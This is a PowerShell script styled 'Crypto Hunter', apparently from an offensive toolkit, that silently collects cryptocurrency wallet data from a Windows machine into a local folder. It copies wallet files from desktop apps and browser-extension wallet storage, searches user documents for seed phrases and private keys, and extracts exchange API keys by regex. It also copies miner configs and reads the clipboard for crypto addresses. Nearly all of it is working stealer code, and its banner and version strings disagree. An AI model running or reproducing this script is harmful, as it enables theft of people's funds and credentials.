<# ═══════════════════════════════════════════════════════════════════════
   FLLC | FU PERSON | CRYPTO HUNTER v2.0
   ╔══════════════════════════════════════════════════════════════════╗
   ║  Wallet + Seed Phrase Hunting                                    ║
   ║  11 wallets | BIP-39 seed search | Private key extraction        ║
   ║  Exodus, MetaMask, Phantom, Bitcoin Core, Electrum + more        ║
   ╚══════════════════════════════════════════════════════════════════╝
═══════════════════════════════════════════════════════════════════════ #>

param(
    [string]$OutputDir = "$PSScriptRoot\..\..\collected\crypto",
    [switch]$Silent = $true
)

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$logFile = Join-Path $OutputDir "crypto_hunt_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
function CrLog($m) { Add-Content $logFile "[$(Get-Date -Format 'HH:mm:ss')] $m" -Encoding UTF8 }

CrLog "=== FLLC Crypto Hunter v1.777 Started ==="

# ══════════════════════════════════════════════════════════════════════════
#  DESKTOP WALLETS
# ══════════════════════════════════════════════════════════════════════════

$walletDir = Join-Path $OutputDir "wallets"
New-Item -ItemType Directory -Path $walletDir -Force | Out-Null

$desktopWallets = @{
    # Bitcoin
    "Bitcoin_Core"     = "$env:APPDATA\Bitcoin"
    "Electrum"         = "$env:APPDATA\Electrum"
    "Wasabi"           = "$env:APPDATA\WalletWasabi\Client"
    "Sparrow"          = "$env:APPDATA\Sparrow"
    "BlueWallet"       = "$env:APPDATA\BlueWallet"
    
    # Ethereum
    "MetaMask_Desktop" = "$env:APPDATA\MetaMask"
    "MyEtherWallet"    = "$env:APPDATA\MyEtherWallet"
    "MyCrypto"         = "$env:APPDATA\MyCrypto"
    
    # Multi-chain
    "Exodus"           = "$env:APPDATA\Exodus\exodus.wallet"
    "Atomic"           = "$env:APPDATA\atomic\Local Storage\leveldb"
    "Jaxx"             = "$env:APPDATA\com.liberty.jaxx\IndexedDB"
    "JaxxLiberty"      = "$env:APPDATA\Jaxx Liberty\IndexedDB"
    "Coinomi"          = "$env:APPDATA\Coinomi\Coinomi\wallets"
    "Guarda"           = "$env:APPDATA\Guarda"
    "Trust_Wallet"     = "$env:APPDATA\Trust Wallet"
    "ZenGo"            = "$env:APPDATA\ZenGo"
    "Edge_Wallet"      = "$env:APPDATA\Edge"
    
    # Monero / Privacy
    "Monero_GUI"       = "$env:USERPROFILE\Documents\Monero\wallets"
    "Monero_CLI"       = "$env:USERPROFILE\Monero"
    "Feather"          = "$env:APPDATA\feather"
    "Zcash"            = "$env:APPDATA\Zcash"
    
    # Solana
    "Phantom_Desktop"  = "$env:APPDATA\Phantom"
    "Solflare"         = "$env:APPDATA\Solflare"
    
    # Other
    "Daedalus"         = "$env:APPDATA\Daedalus Mainnet"
    "Yoroi"            = "$env:APPDATA\Yoroi"
    "Nami"             = "$env:APPDATA\Nami"
    "TronLink"         = "$env:APPDATA\TronLink"
    "Terra_Station"    = "$env:APPDATA\Terra Station"
    "Keplr"            = "$env:APPDATA\Keplr"
    "Binance_Desktop"  = "$env:APPDATA\Binance"
    
    # Hardware wallet companion apps
    "Ledger_Live"      = "$env:APPDATA\Ledger Live"
    "Trezor_Suite"     = "$env:APPDATA\@trezor\suite-desktop"
    "KeepKey"          = "$env:APPDATA\KeepKey"
}

foreach ($name in $desktopWallets.Keys) {
    $path = $desktopWallets[$name]
    if (-not (Test-Path $path)) { continue }
    
    $dest = Join-Path $walletDir $name
    New-Item -ItemType Directory -Path $dest -Force | Out-Null
    
    # Copy key wallet files
    $walletExts = @('*.wallet','*.dat','*.key','*.keys','*.json','*.db','*.sqlite','*.ldb','*.log','*.conf','*.cfg','*.seco')
    foreach ($ext in $walletExts) {
        Get-ChildItem $path -Recurse -File -Filter $ext -ErrorAction SilentlyContinue | Select-Object -First 50 | ForEach-Object {
            $relPath = $_.FullName.Replace($path, '').TrimStart('\')
            $destFile = Join-Path $dest ($relPath -replace '\\','_')
            Copy-Item $_.FullName $destFile -Force 2>$null
        }
    }
    
    CrLog "Wallet: $name - data captured from $path"
}

# ══════════════════════════════════════════════════════════════════════════
#  BROWSER EXTENSION WALLETS
# ══════════════════════════════════════════════════════════════════════════

$extDir = Join-Path $OutputDir "browser_extensions"
New-Item -ItemType Directory -Path $extDir -Force | Out-Null

# Known extension IDs (Chrome Web Store)
$extensionIds = @{
    "MetaMask"           = "nkbihfbeogaeaoehlefnkodbefgpgknn"
    "Phantom"            = "bfnaelmomeimhlpmgjnjophhpkkoljpa"
    "Coinbase_Wallet"    = "hnfanknocfeofbddgcijnmhnfnkdnaad"
    "Trust_Wallet"       = "egjidjbpglichdcondbcbdnbeeppgdph"
    "Brave_Wallet"       = "brave_builtin"
    "Keplr"              = "dmkamcknogkgcdfhhbddcghachkejeap"
    "Solflare"           = "bhhhlbepdkbapadjdcodbhgjbhjfccfo"
    "Temple_Tezos"       = "ookjlbkiijinhpmnjffcofjonbfbgaoc"
    "TronLink"           = "ibnejdfjmmkpcnlpebklmnkoeoihofec"
    "Ronin"              = "fnjhmkhhmkbjkkabndcnnogagogbneec"
    "Rabby"              = "acmacodkjbdgmoleebolmdjonilkdbch"
    "OKX_Wallet"         = "mcohilncbfahbmgdjkbpemcciiolgcge"
    "Backpack"           = "aflkmfhebedbjioipglgcbcmnbpgliof"
    "Sui_Wallet"         = "opcgpfmipidbgpenhmajoajpbobppdil"
    "XDEFI"              = "hmeobnfnfcmdkdcmlblgagmfpfboieaf"
    "Zerion"             = "klghhnkeealcohjjanjjdaeeggmfmlpl"
    "Rainbow"            = "opfgelmcmbiajamepnmloijbpoleiama"
    "Core_Avalanche"     = "agoakfejjabomempkjlepdflaleeobhb"
    "Bitget"             = "jiidiaalihmmhddjgbnbgdffknnnnbehh"
    "Petra_Aptos"        = "ejjladinnckdgjemekebdpeokbikhfci"
}

$browserBases = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    "Opera"  = "$env:APPDATA\Opera Software\Opera Stable"
    "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data"
}

foreach ($browser in $browserBases.Keys) {
    $basePath = $browserBases[$browser]
    if (-not (Test-Path $basePath)) { continue }
    
    $profiles = @("Default") + (Get-ChildItem $basePath -Directory -Filter "Profile *" | ForEach-Object { $_.Name })
    
    foreach ($profile in $profiles) {
        $extBase = "$basePath\$profile\Extensions"
        if (-not (Test-Path $extBase)) { continue }
        
        foreach ($extName in $extensionIds.Keys) {
            $extId = $extensionIds[$extName]
            $extPath = "$extBase\$extId"
            if (-not (Test-Path $extPath)) { continue }
            
            $dest = Join-Path $extDir "${browser}_${profile}_${extName}"
            New-Item -ItemType Directory -Path $dest -Force | Out-Null
            
            # Copy extension storage (contains encrypted vault data)
            Get-ChildItem $extPath -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 100 | ForEach-Object {
                $relPath = $_.FullName.Replace($extPath, '').TrimStart('\') -replace '\\','_'
                Copy-Item $_.FullName (Join-Path $dest $relPath) -Force 2>$null
            }
            
            # Also grab the extension's IndexedDB
            $idbPath = "$basePath\$profile\IndexedDB\chrome-extension_${extId}_0.indexeddb.leveldb"
            if (Test-Path $idbPath) {
                $idbDest = Join-Path $dest "indexeddb"
                New-Item -ItemType Directory -Path $idbDest -Force | Out-Null
                Get-ChildItem $idbPath -File | ForEach-Object {
                    Copy-Item $_.FullName (Join-Path $idbDest $_.Name) -Force 2>$null
                }
            }
            
            # Local Storage for extension
            $lsPath = "$basePath\$profile\Local Extension Settings\$extId"
            if (Test-Path $lsPath) {
                $lsDest = Join-Path $dest "localstorage"
                New-Item -ItemType Directory -Path $lsDest -Force | Out-Null
                Get-ChildItem $lsPath -File | ForEach-Object {
                    Copy-Item $_.FullName (Join-Path $lsDest $_.Name) -Force 2>$null
                }
            }
            
            CrLog "Extension: $extName found in $browser/$profile"
        }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  SEED PHRASE / MNEMONIC DISCOVERY
# ══════════════════════════════════════════════════════════════════════════

$seedDir = Join-Path $OutputDir "seed_discovery"
New-Item -ItemType Directory -Path $seedDir -Force | Out-Null

# BIP-39 word list indicators (search for files containing these patterns)
$mnemonicIndicators = @(
    'abandon ability able about above absent',
    'seed phrase','recovery phrase','mnemonic','backup words',
    'word 1','word 2','word 3','word 4','word 5','word 6',
    'word 7','word 8','word 9','word 10','word 11','word 12',
    'private key','secret key','wallet backup'
)

$searchLocations = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\Pictures",
    "$env:USERPROFILE\OneDrive\Desktop",
    "$env:USERPROFILE\OneDrive\Documents"
)

$seedFindings = @()
foreach ($loc in $searchLocations) {
    if (-not (Test-Path $loc)) { continue }
    
    # Search text files, notes, etc.
    Get-ChildItem $loc -Recurse -File -Include "*.txt","*.doc","*.docx","*.rtf","*.md","*.note","*.csv","*.json" -ErrorAction SilentlyContinue | 
        Select-Object -First 200 | ForEach-Object {
        try {
            $content = Get-Content $_.FullName -Raw -ErrorAction Stop
            foreach ($indicator in $mnemonicIndicators) {
                if ($content -match [regex]::Escape($indicator)) {
                    Copy-Item $_.FullName (Join-Path $seedDir $_.Name) -Force 2>$null
                    $seedFindings += @{
                        file = $_.FullName
                        indicator = $indicator
                        size = $_.Length
                    }
                    CrLog "SEED PHRASE CANDIDATE: $($_.FullName) (matched: $indicator)"
                    break
                }
            }
        } catch {}
    }
}

if ($seedFindings.Count -gt 0) {
    $seedFindings | ConvertTo-Json -Depth 3 | Out-File "$seedDir\findings.json" -Encoding UTF8
}

# ══════════════════════════════════════════════════════════════════════════
#  EXCHANGE API KEYS / CONFIGS
# ══════════════════════════════════════════════════════════════════════════

$exchangeDir = Join-Path $OutputDir "exchanges"
New-Item -ItemType Directory -Path $exchangeDir -Force | Out-Null

# Search for API key patterns in common locations
$apiKeyPatterns = @{
    "Binance"    = '(?i)(binance|bnb)[_-]?(api|key|secret)\s*[=:]\s*[''"]?([A-Za-z0-9]{32,})'
    "Coinbase"   = '(?i)(coinbase|cb)[_-]?(api|key|secret)\s*[=:]\s*[''"]?([A-Za-z0-9]{16,})'
    "Kraken"     = '(?i)(kraken)[_-]?(api|key|secret)\s*[=:]\s*[''"]?([A-Za-z0-9/+=]{16,})'
    "FTX"        = '(?i)(ftx)[_-]?(api|key|secret)\s*[=:]\s*[''"]?([A-Za-z0-9_-]{16,})'
    "KuCoin"     = '(?i)(kucoin)[_-]?(api|key|secret)\s*[=:]\s*[''"]?([A-Za-z0-9-]{16,})'
    "Gemini"     = '(?i)(gemini)[_-]?(api|key|secret)\s*[=:]\s*[''"]?([A-Za-z0-9]{20,})'
    "Bybit"      = '(?i)(bybit)[_-]?(api|key|secret)\s*[=:]\s*[''"]?([A-Za-z0-9]{16,})'
    "OKX"        = '(?i)(okx|okex)[_-]?(api|key|secret)\s*[=:]\s*[''"]?([A-Za-z0-9-]{16,})'
}

$apiKeyFindings = @()
$envFileLocations = @("$env:USERPROFILE", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop")

foreach ($loc in $envFileLocations) {
    if (-not (Test-Path $loc)) { continue }
    Get-ChildItem $loc -Recurse -File -Include "*.env","*.txt","*.json","*.yaml","*.yml","*.conf","*.cfg","*.ini","*.py","*.js" -ErrorAction SilentlyContinue |
        Select-Object -First 100 | ForEach-Object {
        try {
            $content = Get-Content $_.FullName -Raw -ErrorAction Stop
            foreach ($exchange in $apiKeyPatterns.Keys) {
                $matches = [regex]::Matches($content, $apiKeyPatterns[$exchange])
                if ($matches.Count -gt 0) {
                    Copy-Item $_.FullName (Join-Path $exchangeDir "${exchange}_$($_.Name)") -Force 2>$null
                    $apiKeyFindings += @{
                        exchange = $exchange
                        file = $_.FullName
                        matches = $matches.Count
                    }
                    CrLog "EXCHANGE API KEY: $exchange found in $($_.FullName)"
                }
            }
        } catch {}
    }
}

if ($apiKeyFindings.Count -gt 0) {
    $apiKeyFindings | ConvertTo-Json -Depth 3 | Out-File "$exchangeDir\api_key_findings.json" -Encoding UTF8
}

# ══════════════════════════════════════════════════════════════════════════
#  MINING SOFTWARE
# ══════════════════════════════════════════════════════════════════════════

$miningDir = Join-Path $OutputDir "mining"
New-Item -ItemType Directory -Path $miningDir -Force | Out-Null

$minerPaths = @{
    "NiceHash"    = "$env:LOCALAPPDATA\Programs\NiceHash Miner"
    "PhoenixMiner"= "$env:USERPROFILE\PhoenixMiner"
    "T-Rex"       = "$env:USERPROFILE\t-rex"
    "lolMiner"    = "$env:USERPROFILE\lolMiner"
    "NBMiner"     = "$env:USERPROFILE\NBMiner"
    "XMRig"       = "$env:USERPROFILE\xmrig"
    "Claymore"    = "$env:USERPROFILE\Claymore"
    "HiveOS"      = "$env:USERPROFILE\hiveos"
}

foreach ($miner in $minerPaths.Keys) {
    $path = $minerPaths[$miner]
    if (-not (Test-Path $path)) { continue }
    
    Get-ChildItem $path -File -Include "*.json","*.bat","*.cmd","*.conf","*.cfg","*.txt" -Recurse -ErrorAction SilentlyContinue | 
        Select-Object -First 20 | ForEach-Object {
        Copy-Item $_.FullName (Join-Path $miningDir "${miner}_$($_.Name)") -Force 2>$null
    }
    CrLog "Mining: $miner config captured"
}

# ══════════════════════════════════════════════════════════════════════════
#  CRYPTO ADDRESS DISCOVERY (clipboard history + files)
# ══════════════════════════════════════════════════════════════════════════

$addrDir = Join-Path $OutputDir "addresses"
New-Item -ItemType Directory -Path $addrDir -Force | Out-Null

# Get current clipboard
try {
    Add-Type -AssemblyName System.Windows.Forms
    $clipboard = [System.Windows.Forms.Clipboard]::GetText()
    if ($clipboard) {
        $cryptoPatterns = @{
            "Bitcoin"  = '(?<![a-zA-Z0-9])[13][a-km-zA-HJ-NP-Z1-9]{25,34}(?![a-zA-Z0-9])|(?<![a-zA-Z0-9])bc1[a-zA-HJ-NP-Z0-9]{39,59}(?![a-zA-Z0-9])'
            "Ethereum" = '(?<![a-zA-Z0-9])0x[a-fA-F0-9]{40}(?![a-zA-Z0-9])'
            "Monero"   = '(?<![a-zA-Z0-9])4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}(?![a-zA-Z0-9])'
            "Solana"   = '(?<![a-zA-Z0-9])[1-9A-HJ-NP-Za-km-z]{32,44}(?![a-zA-Z0-9])'
            "Litecoin" = '(?<![a-zA-Z0-9])[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}(?![a-zA-Z0-9])'
        }
        
        $clipFindings = @()
        foreach ($coin in $cryptoPatterns.Keys) {
            $m = [regex]::Matches($clipboard, $cryptoPatterns[$coin])
            if ($m.Count -gt 0) {
                $clipFindings += @{ coin = $coin; addresses = ($m.Value | Sort-Object -Unique) }
            }
        }
        
        if ($clipFindings.Count -gt 0) {
            $clipFindings | ConvertTo-Json -Depth 3 | Out-File "$addrDir\clipboard_crypto.json" -Encoding UTF8
            CrLog "Clipboard: Crypto addresses found"
        }
    }
} catch {}

# ══════════════════════════════════════════════════════════════════════════
#  SUMMARY
# ══════════════════════════════════════════════════════════════════════════

$totalFiles = (Get-ChildItem $OutputDir -Recurse -File | Measure-Object).Count
$totalSize = [math]::Round((Get-ChildItem $OutputDir -Recurse -File | Measure-Object -Property Length -Sum).Sum / 1024, 1)

CrLog "=== CRYPTO HUNT COMPLETE ==="
CrLog "Files: $totalFiles | Size: ${totalSize}KB"
CrLog "Wallets: $($desktopWallets.Keys.Count) checked | Extensions: $($extensionIds.Keys.Count) checked"
CrLog "Seed candidates: $($seedFindings.Count) | API keys: $($apiKeyFindings.Count)"

@{
    timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    hostname = $env:COMPUTERNAME
    total_files = $totalFiles
    total_size_kb = $totalSize
    wallets_found = ($desktopWallets.Keys | Where-Object { Test-Path $desktopWallets[$_] }).Count
    extensions_found = $extensionIds.Keys.Count
    seed_candidates = $seedFindings.Count
    api_keys_found = $apiKeyFindings.Count
} | ConvertTo-Json | Out-File "$OutputDir\crypto_manifest.json" -Encoding UTF8
